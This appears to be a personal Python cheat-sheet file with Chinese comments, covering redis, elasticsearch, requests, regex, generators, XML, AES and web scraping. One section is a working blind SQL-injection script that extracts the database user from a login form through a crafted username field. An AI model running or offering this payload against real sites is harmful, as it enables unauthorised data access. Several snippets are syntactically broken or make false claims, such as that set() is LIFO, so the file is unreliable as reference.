#!/usr/bin/python
# coding=utf-8


# n个点最多把线分成几段
def A(n):
	return n+1

# n条线最多把平面分成几块
def B(n):
	if n == 1:
		return 2
	return B(n-1) + A(n-1)

# n个平面最多把空间分成几块
def C(n):
	if n == 1:
		return 2
	return C(n-1) + B(n-1)

#---------------------------------------------------------------------------------------------
# python redis操作, 可用连接池或单独初始化连接, 操作可用pipeline(类似事务)
import redis

#r = redis.Redis(host='127.0.0.1', port=6379, db=0)
pool = redis.ConnectionPool(host='127.0.0.1', port=6379)
r = redis.Redis(connection_pool=pool)
#pipe = r.pipeline(transaction=True)
#r.set('key1', 'value1')
#r.set('key2', 'value2')
#r.setex('key3', 'value3', 10) #设置过期时间(s)
#r.psetex('key4', 1000, 'value4')  # 微秒
#r.mget('name1', 'name2')
#r.get('name1')
#r.getrange('name', 0, 3) #截取
#r.setrange('name', 3, 'zzz')  #替换
#r.setbit(name, offset, value) #
#r.getset('key1', 'tony')
#r.mset(name1='zhangsan', name2='lisi')
#r.mset({'name1': 'zhangsan', 'name2': 'lisi'})

#r.lpush('origin_data', line)
#pipe.execute()

rs = r.srandmember('set_demo', 3)
for r in rs:
  print(r.decode('utf-8'))

#---------------------------------------------------------------------------------------------
# elasticsearch 简单操作demo
from datetime import datetime
from elasticsearch import Elasticsearch

es = Elasticsearch(['127.0.0.1:9200'])

if not es.indices.exists('my-index'):
  es.indices.create(index='my-index')

data1 = {"any":"data01","timestamp":datetime.now()}
data2 = {"any":"data01","timestamp":datetime.now()}
es.index(index='my-index', doc_type='test-type', body=data1, id=1, refresh=True)
es.index(index='my-index', doc_type='test-type', body=data2, id=2, refresh=True)

rs = es.get(index='my-index', doc_type='test-type', id=1)
rs2 = es.search(index='news', body={"query":{"text":{"channel": "日本"}}})

#---------------------------------------------------------------------------------------------
#  requests demo
# http://docs.python-requests.org/zh_CN/latest/user/quickstart.html
# http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advanced

# get方法与post方法不同的地方, 传递参数, 其他参数heaaders/timeout/cookies/proxies/allow_redirects
# headers/cookies/proxies为dict类型,timeout为整型/浮点数,allow_redicts为Boolean类型,

r = requests.get('http://httpbin.org/get', params={})
r = requests.post('http://httpbin.org/post', data={}) #如果参数已经格式化, 也可以用json={}传参数

r.text
r.url
r.content
r.json()
r.cookies
r.status_code
r.reason
r.heaaders
r.headers.get('content-type')
r.headers['Content-Type']
r.encoding  #可改变
load_cookies = requests.utils.dict_from_cookiejar(r.cookies) #将r.cookies转为字典
r.requests.headers #请求headers

# 构造自定义cookies, 在请求里cookies=jar调用
jar = requests.cookies.RequestsCookieJar()
jar.set('key1', 'val1')

# 会话对象, 跨请求保持某些参数
s = requests.Session()
s.get('http://httpbin.org/cookies/set/sessioncookie/123456789')
r = s.get("http://httpbin.org/cookies")

#---------------------------------------------------------------------------------------------
# struct模块, 用于对数据格式进行转换

struct.pack('ii', 20, 400)  #将20, 400两个变量转为字节流
struct.unpack('ii', b'sabchack')    # 将字节流转为python数据类型
struct.calcsize('iflcb')  # 计算格式字符串对应的结果长度(Bytes)

#---------------------------------------------------------------------------------------------
# pprint模块, 打印任何python数据结构类和方法

class pprint.PrettyPrinter(indent=1,width=80,depth=None, stream=None)  #创建一个PrettyPrinter对象
pprint.pformat(object, indent=1, width=80, depth=None)  #返回格式化的对象字符串
pprint.pprint(object, stream=None, indent=1, width=80, depth=None)  #输出格式的对象字符串到指定的stream,最后以换行符结束
pprint.isreadable(object)  #判断对象object的字符串对象是否可读
pprint.isreadable(object)  #判断对象是否需要递归的表示
pprint.saferepr(object)  #返回一个对象字符串

#---------------------------------------------------------------------------------------------
# pickle模块, 数据序列化和反序列化

pickle.dump(object, fileHandler [, protocol]) #将对象obj保存到文件fileHandler中
pickle.load(fileHandler)  #从fileHandler中读取一个字符串, 并将它重构为原来的python对象

#---------------------------------------------------------------------------------------------
# timeit 精确计算小段代码执行时间

# python -m timeit 'func or statement'
timeit.timeit(stmt='pass', setup='pass', timer=<default timer>, number=1000, globals=globals())
timeit.repeat(stmt='pass', setup='pass', timer=<default timer>, repeat=3, number=1000, globals=globals())
timeit.default_timer()
timeit.Timer('for i in range(10): oct(i)', 'gc.enable()').timeit()

#---------------------------------------------------------------------------------------------
# dis 将python代码转为字节码序列

import dis
dis.dis(f)

#---------------------------------------------------------------------------------------------
# pdb调试

# python -m pdb test.py
# list # 最近代码片段
# next or n # 执行下一行
# break demo.py:6 # 在第6行设置断点
# break demo.main  # 在main函数处设置断点
# pp # 打印变量的值
# step or s  # 进入函数
# exit or q # 退出
# return or r  # 执行代码直到从当前函数退出
# continue or c # 继续执行

import inspect
import email.mime.text
print(inspect.getmro(email.mime.text.MIMEText)) #分析对象

#---------------------------------------------------------------------------------------------
# python 异常处理

try:
    # 运行别的代码
except <名字>:
    # 如果在try部分发生了异常
except <名字> as <数据>:
    # 如果引发了异常, 获得附加的数据
else:
    # 如果没有异常发生

try:
    # ...
finally:
    # ...

#---------------------------------------------------------------------------------------------
# python枚举类

from Enum import enum, unique

@unique
class Color(enum):
  red = 1
  green = 2
  blue = 3
  red_alias = 1  # 因为加了unique装饰器, 所以会报错

Color['red']
Color.red
red = Color.red
red.name
red.value

for color in Color:  # 不包括值重复
for color in Color.__members__.items():  # 包括值重复
enumerate(list)  # 将列表转为带有index的枚举

#---------------------------------------------------------------------------------------------
# 1.形参与实参要一一对应
def fun_name(x, y):
    print(x, y)

# 调用方式
fun_name(1, 2)


# 2. 参数带默认值
def fun_name_2(x=1, y=3):
    print(x, y)

# x=5, y取了默认值
fun_name_2(5)
fun_name_2(x=5)
# x取默认值, y=8
fun_name_2(8)

# 3. 参数个数未定, 在函数内可通过名为args的tuple访问所有参数值
def fun_name_3(*args):
    print(args)

# 调用方式
fun_name_3(1, 'demo', {'name':'tony'}, ['aa', 'bb'])

# 4. 参数个数未定, 在函数内通过名为args的dict访问所有参数的key和value
def fun_name_4(**args):
    print(args)

# 调用方式
fun_name_4(a='fuck', b=5)


# 四种形式参数的顺序如下:
def fun_name(x, y=5, *args, **kwargs):
    print(x, y, args, kwargs)

#---------------------------------------------------------------------------------------------

# 自定义的日志输出
def log(msg, level = logging.DEBUG):
    logging.log(level, msg)
    print('%s [%s], msg:%s' % (datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), level, msg))

    if level == logging.WARNING or level == logging.ERROR:
        for line in traceback.format_stack():
            print(line.strip())
        for line in traceback.format_stack():
            logging.log(level, line.strip())

# 服务器使用, 清理端口占用
def kill_ports(ports):
    for port in ports:
        log('kill %s start' % port)
        popen = subprocess.Popen('lsof -i:%s' % port, shell = True, stdout = subprocess.PIPE)
        (data, err) = popen.communicate()
        log('data:\n%s  \nerr:\n%s' % (data, err))

        pattern = re.compile(r'\b\d+\b', re.S)
        pids = re.findall(pattern, data)
        log('pids:%s' % str(pids))
        for pid in pids:
            if pid != '' and pid != None:
                try:
                    log('pid:%s' % pid)
                    popen = subprocess.Popen('kill -9 %s' % pid, shell = True, stdout = subprocess.PIPE)
                    (data, err) = popen.communicate()
                    log('data:\n%s  \nerr:\n%s' % (data, err))
                except Exception as e:
                    log('kill_ports exception:%s' % e)
        log('kill %s finish' % port)
    time.sleep(1)

 # 单例类
class Singleton(object):
    def __new__(cls, *args, **kw):
        if not hasattr(cls, '_instance'):
            orig = super(Singleton, cls)
            cls._instance = orig.__new__(cls, *args, **kw)
            cls.is_init = False
        return cls._instance

# 爬取百度搜索结果列表
def crawlerBaidu(url):
    headers = {}
    r = requests.get(url, headers=headers)
    html = pyquery.PyQuery(r.text)
    for site in html('h3.t a').items():
        r1 = requests.get(site.attr('href'), headers=headers, allow_redirects=False)
        if r1.status_code == 200:
            re.search(r'URL=\'(.*?)\'', r1.text.encode('utf-8'), re.S).group(1)
        elif r1.status_code == 302:
            r1.headers.get('location') #跳转后的地址
        else:
            pass

# 爬取百度热词
def baidu_hotword():
  url = 'http://news.baidu.com/n?m=rddata&v=hot_word&type={0}&date={1}'
  import json
  jj = json.loads(getHtml(url.format(1, 20170424)))
  for i in range(0,len(jj['data'])):
    print(jj['data'][i]['title'])
    print(jj['data'][i]['query_word'])
    print(jj['data'][i]['desc'])
    print(jj['data'][i]['image'])
    print(jj['data'][i]['image_v'])

# 图片下载
def download_pic(pic_url, save_path):
  pic = urllib.request.urlopen(pic_url)
  temp = open(os.path.join(save_path, pic_url[pic_url.rfind('/'):]), 'wb')
  temp.write(pic.read())
  temp.close()

# 循环输出指定范围的日期
def loop_date():
  begin = datetime.date(2016, 1, 1)
  end = datetime.date(2016, 11, 29)
  for i in range((end - begin).days + 1):
    day = begin + datetime.timedelta(days=i)
    print(str(day))


# 循环输出指定范围的日期2
def loop_date2():
  begin = datetime.date(2016, 1, 1)
  end = datetime.date(2016, 11, 29)
  d = begin
  delta = datetime.timedelta(days=1)
  while d <= end:
    print(d.strftime("%Y-%m/%d"))
    d += delta

# 循环输出指定范围的日期3
def dateRange(beginDate, endDate):
    dates = []
    dt = datetime.datetime.strptime(beginDate, "%Y%m%d")
    date = beginDate[:]
    while date <= endDate:
        dates.append(date)
        dt = dt + datetime.timedelta(1)
        date = dt.strftime("%Y%m%d")
    return dates

# DNS正向查询 python demo.py www.domain.com
result = socket.getaddrinfo(sys.argv[1], None)

# DNS反向查询 python demo.py 123.32.52.83
result = socket.gethostbyaddr(sys.argv[1])

# 递归扫描目录
def read_dir(filepath):
  files = os.listdir(filepath)
  for f in files:
    fd = os.path.join(filepath, f)
    if os.path.isdir(fd):
      read_dir(fd)
    else:
      if re.match('^(content_|)\d{1,20}.htm$',fd):
        print(os.path.join(filepath, fd))
      else:
        pass

# 递归扫描目录2
def read_dir2(filepath):
    for fpath,dirs,fs in os.walk(filepath):
        for f in fs:
            print(os.path.join(fpath, f))

# 读取excel表格
def read_excel(file):
    import xlrd
    from xlrd import xldate_as_tuple
    import datetime

    data = xlrd.open_workbook(file)
    table = data.sheets()[0]  #通过sheets顺序获取
    table = data.sheet_by_index(0) #通过索引顺序获取
    table = data.sheeet_by_name(u'Sheet1') #通过名称获取
    nrows = table.nrows #行数
    ncols = table.ncols #列数

    table.row_values(i) #第i行的数据
    table.col_values(i) #第i列的数据

    createtime = xldate_as_tuple(table.cell(i, 6).value, 0)
    format_createtime = datetime.datetime(*createtime)

    cell_A1 = table.cell(0, 0).value #单元格
    cell_A1 = table.row(0)[0].value
    cell_A2 = table.col(1)[0].value
    table.put_cell(row, col, ctype='1', value, xf='0')  #写入


# csv文件读写
def read_csv(file):
    import csv
    with open(file, 'r+') as f:
      reader = csv.reader(f)
      for row in reader:
        print(row)
    with open(file, 'a+') as f:
      writer = csv.writer(f, dialect='excel')
      writer.writerow(['col1','col2','col3'])

# 文件读取, 逐行读取而非一次读入内存
def file_read(file):
    f = open(file, 'r+')
    for line in f.readlines():
        print(line)

# 文件按块读取
def file_read2(file):
    BUFSIZE = 1024
    with open(file, 'rb') as f:
        while True:
            block = f.read(BUFSIZE)
            if block:
                yield block
            else:
                return

# 子进程调用
def subprocess_demo():
  import subprocess
  p = subprocess.Popen('ping baidu.com', shell=True, stdout=subprocess.PIPE)
  #等待进程结束
  p.wait()
  outs, errs = p.communicate(timeout=15)
  outs = subprocess.check_output('ipconfig',shell=True)
  print(outs.decode('utf-8'))

#---------------------------------------------------------------------------------------------

# 正则匹配nginx login format
re.findall(r'(.*?)\- (.*?) \[(.*?)\] "(.*?)" (.*?) (.*?) "(.*?)" "(.*?)" (.*)', line)
# insert into searchlog('remote_addr,remote_user,time_local,request,status,body_bytes_sent,http_referer,http_user_agent,http_x_forwarded_for) values(%s,%s,%s,%s,%s,%s,%s,%s,%s)', [info[0][0][0:15], info[0][1][0:10], info[0][2][0:30], info[0][3][0:255], info[0][4], info[0][5], info[0][6][0:255], info[0][7][0:150], info[0][8][0:30]])

# 正则提取aaa和bbb之间的所有内容，包括换行
re.findall(r'aaa([\s\S]*?)bbb', log)

# 是否匹配中文
re.search(r'[\u4e00-\u9fa5]', log)

# 抽取链接地址
re.findall(r'(?<=href=").*?(?=")', html)

# 抽取百度图片
re.findall(r'(?<=class="BDE_Image" src=").*?(?=")', html)

# 正则替换, 把html中的aaaa替换为bbbb
html = re.sub('aaaa', 'bbbb', html)

# 正则查找
xxx = re.search(pattern, html).group()

# 正则
reg_all = r'http://\w{2,13}.domain.com[^\s"\'>]*'
reg_detail= r'http://\w{2,13}.domain.com/[^."\s>]*/2017-05/02/content_\d{5,10}.htm$'
reg_node = r'http://\w{2,13}.domain.com/[^."\s>]*/(default|default_\d{1}|node_\d+|node_\d+_\d{1}).htm$'
reg_channel = r'http://\w{2,13}.domain.com/$'

# re.match和re.search的区别在于, 前者是全文匹配, 后者是部分查找

#---------------------------------------------------------------------------------------------

dict_arg.keys()   # 字典对象的所有键
dict_arg.values() # 字典对象的所有值

'key' in dict.keys()
dict.has_key('key')
[v for v in dict.values()]
[k for k in dict.keys()]
[{k:v} for k,v in dict.items]

globals() # 在方法内使用, 返回所有全局变量
locals()  # 在方法内使用, 返回所有局部变量

del val   # 从内存删除变量

#---------------------------------------------------------------------------------------------

# python字符串处理
'{0},{1}'.format('v1', 'v2') # v1,v2
'{self.name},{self.age}'.format(self=self) #
'{0[0]},{0[1]}'.format(['what', 25]) # what,25
'{:>8}'.format('189')  # 右对齐, 8位, 左边填充空格
'{:0<8}'.format('189') # 左对齐, 8位, 右边填充0
'{:a^8}'.format('tony') # 居中对齐, 8位, 两遍填充a
'{:.2f}'.format(321.33345) # 保留2位小数
'{:b}'.format(17)  # 二进制
'{:d}'.format(17)  # 十进制
'{:o}'.format(17)  # 八进制
'{:x}'.format(17)  # 十六进制
'{:,}'.format(1234567890) # 用,分隔千分位

# 占位符
'i am %s, %d years old.' % ('tony', 25)
'i am %(name)s, %(age)d years old.' % {'name': 'tony', 'age': 25} #这里是用了一个dict来对应


# 字符串(string) 'abc' 或 str()
# 字节流(bytes) b'abc' 或 bytes()
# str.encode() -> bytes
# bytes.decode() -> str

#---------------------------------------------------------------------------------------------

# lambda: 快速定义单行最小函数, 类似C中的宏, 借用于Lisp.
g = lambda x: x * 3
g(3) #返回9
(lambda y: y * y)(3) #返回9

# map(function, sequence): 对可迭代序列sequence中的item依次执行function(item), 返回一个迭代器
def cube(x):
    return x * x * x
list(map(cube, range(1, 11))) #返回1到10的立方列表

def plus(x):
    return x + x
list(map(plus, 'abcd')) #返回['aa', 'bb', 'cc', 'dd']

# filter(function, sequence): 对可迭代序列sequence中的item依次执行function(item), 将执行结果为True的item返回迭代器
def f(x):
    return x % 2 != 0 and x % 3 != 0
filter(f, range(2, 24)) #返回一个迭代器, 以next(iterable)来遍历
list(filter(f, range(1,50)))

# filter/map/reduce和lambda结合使用
reduce(lambda x,y: x+'-'+y, ['a','v','b','d']) #返回'a-v-b-d'

list(filter(lambda x: x != 'a', 'abcdef')) #返回['b', 'c', 'd', 'e', 'f']

list(map(lambda x: x*x, range(1, 5))) #返回[1, 4, 9, 16]

# 帕斯卡三角
# yield的作用是把一个函数变成一个generator, 调用该函数返回一个可迭代对象
# sum([seq1, ...]) #对可迭代对象求和
# zip([seq1, ...]) #接收一系列可迭代对象作为参数, 将对象中对应的元素打包成一个个tuple, 然后返回由这些tuple组成的迭代器
def triangles():
    a = [1]
    while sum(a) < 200:
        yield a
        a = [sum(i) for i in zip([0]+a,a+[0])]

for i in triangles():
    print(i)

#或者
for i, j in zip(range(10),triangles()):
    print(j)

# 利用yield的斐波那契数列
def fib(max):
    n, a, b = 0, 0, 1
    while a < max:
        yield a
        a, b = b, a + b
        n = n + 1

g = fib(6)

while True:
    try:
        x = next(g)
        print('g: %d' % x)
    except StopIteration as e:
        break

L = [x*x for x in range(10)]   #这里创建了一个列表, 可迭代但不是生成器
g = (x*x for x in range(10))   #这里创建了一个generator

#---------------------------------------------------------------------------------------------

# 文件写入编码问题
f = codecs.open('filename', 'r+', encoding='utf-8')


# python中的set(), 是一种LIFO的数据结构, 会对元素去重, 主要操作add(value)/pop()/remove(value)/update()

# from collections import deque
# deque是一种双向队列, 允许元素重复, 支持的操作append(value)/pop()/popleft()/reverse()/remove(value)/clear()/copy()/count(value)/extend(value)

#---------------------------------------------------------------------------------------------

# 穷举攻击, 爆破用户名
header = {'Content-Type':'application/x-www-form-urlencoded','Cookie':''}
payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
user = ''
print('======now outputting======')
for i in range(1, 32):
  for payload in payloads:
    try:
      body = "username=admin' and substr(user(), {0}, 1)='{1}&password=bcbe3365e6ac95ea2c0343a2395834dd".format(i, payload)
      conn = http.client.HTTPConnection('login.demo.com', 80)
      conn.request(method='POST', url='/login', body=body, headers=header)
      result = conn.getresponse()
    except KeyboardInterrupt as e:
      print('\n====you just presss ctrl+c to quit====')
      sys.exit(0)
    else:
      if len(result.read())<46:
        sys.stdout.write(payload)
        sys.stdout.flush()

#---------------------------------------------------------------------------------------------
# easygui开发gui程序

import easygui as eg
import sys
while true:
   eg.msgbox("hello world")
   msg = "python good"
   title = 'study'
   choices = ['a','b','c','d']
   choice = eg.choicebox(msg,title,choices)
   eg.msgbox('what is you choice:'+str(choice), 'result')
   msg = 'do you want to try again?'
   title = 'please choose'
   if eg.ccbox(msg, title):
      pass
   else:
      sys.exit(0)

#---------------------------------------------------------------------------------------------
# socket通信服务端
import socket
socket.setdefaulttimeout(2)

s = socket.socket()
s.bind(('127.0.0.1', 5000))
s.listen(5)
cs,address = s.accept()
print('got connected from ', address)
cs.send(b'byebye')
ra = cs.recv(512)
print(ra)
cs.close()

# socket通信客户端
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5000))
data = s.recv(512)
s.send(b'hihi')
s.close()
print('the data received is ',data)

#---------------------------------------------------------------------------------------------
# 创建一个xml文本
from xml.dom import minidom, Node

def createXML(newbook):
	newbook = {"id": "1001", "title": "An apple", "firstname": "Peter", "lastname": "Zhang", "pubdate": "2012-1-12"}
	doc = minidom.Document()
	doc.appendChild(doc.createComment("this is a simple xml"))
	booklist = doc.createElement("booklist")  # 根节点
	booklist.setAttribute('xmlns', 'http://www.sitemap.org/schemas/sitemap/0.9')
	doc.appendChild(booklist)
	book = doc.createElement('book')
	book.setAttribute("id", newbook["id"])
	title = doc.createElement("title")
	title.appendChild(doc.createTextNode(newbook['title']))
	book.appendChild(title)
	author = doc.createElement('author')
	name = doc.createElement('name')
	firstname = doc.createElement("firstname")
	firstname.appendChild(doc.createTextNode(newbook["firstname"]))
	lastname = doc.createElement("lastname")
	lastname.appendChild(doc.createTextNode(newbook["lastname"]))
	name.appendChild(firstname)
	name.appendChild(lastname)
	author.appendChild(name)
	book.appendChild(author)
	pubdate = doc.createElement("pubdate")
	pubdate.appendChild(doc.createTextNode(newbook["pubdate"]))
	book.appendChild(pubdate)
	booklist.appendChild(book)
	f = open("book.xml", "a+")
	doc.writexml(f)
	f.close()


# xml处理类
class bookscanner:
	def __init__(self, doc):
		for child in doc.childNodes:
			if child.nodeType == Node.ELEMENT_NODE \
					and child.tagName == "book":
				bookid = child.getAttribute("id")
				print("*" * 20)
				print("Book id : ", bookid)
				self.handle_book(child)

	def handle_book(self, node):
		for child in node.childNodes:
			if child.nodeType == Node.ELEMENT_NODE:
				if child.tagName == "title":
					print("Title : ", self.getText(child.firstChild))
				if child.tagName == "author":
					self.handle_author(child)
				if child.tagName == "pubdate":
					print("Pubdate : ", self.getText(child.firstChild))

	def getText(self, node):
		if node.nodeType == Node.TEXT_NODE:
			return node.nodeValue
		else:
			return ""

	def handle_author(self, node):
		author = node.firstChild
		for child in author.childNodes:
			if child.nodeType == Node.ELEMENT_NODE:
				if child.tagName == "firstname":
					print("Firstname : ", self.getText(child.firstChild))
				if child.tagName == "lastname":
					print("Lastname : ", self.getText(child.firstChild))

# 解析xml文本
def parseXML(xmlfile):
	doc = minidom.parse(xmlfile)
	for child in doc.childNodes:
		if child.nodeType == Node.COMMENT_NODE:
			print("Conment : ", child.nodeValue)
		if child.nodeType == Node.ELEMENT_NODE:
			bookscanner(child)

#---------------------------------------------------------------------------------------------
# how to encrypt & decrypt with PyCrypto AES 256
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

#---------------------------------------------------------------------------------------------
# 迅雷协议转http
def parseThunder(thunder_url):
    import base64
    decode_bytes = base64.b64decode(thunder_url[10:])
    return decode_bytes.decode('utf-8')[2:-2]

# 贴吧帖子
def parse_tieba(url):
    html = crawl(url, referer='https://tieba.baidu.com', host='tieba.baidu.com')
    soup = bs(html, 'html.parser')
    posts = soup.find_all('div', class_='d_post_content')
    for post in posts:
        print(post.text)
        imgs = post.find_all('img', class_='BDE_Image')
        for img in imgs:
            print(img.get('src'))

# 从mongodb导出数据写入文本
def export_data_from_mongo():
    import pymongo
    client = pymongo.MongoClient('mongodb://localhost:27017')
    db = client['wechat_spider']
    for x in db.profiles.find({'headimg': {'$regex': 'http'}}):
        print(x['title'], x['msgBiz'], x['headimg'])
    client.close()

#  计算数组的熵
def entropy(rows: list) -> float:
    import math
    import collections
    result = collections.Counter()
    result.update(rows)
    rows_len = len(rows)
    assert rows_len  # 数组长度不能为0
    # 开始计算熵值
    ent = 0.0
    for r in result.values():
        p = float(r) / rows_len
        ent -= p * math.log2(p)
    return ent
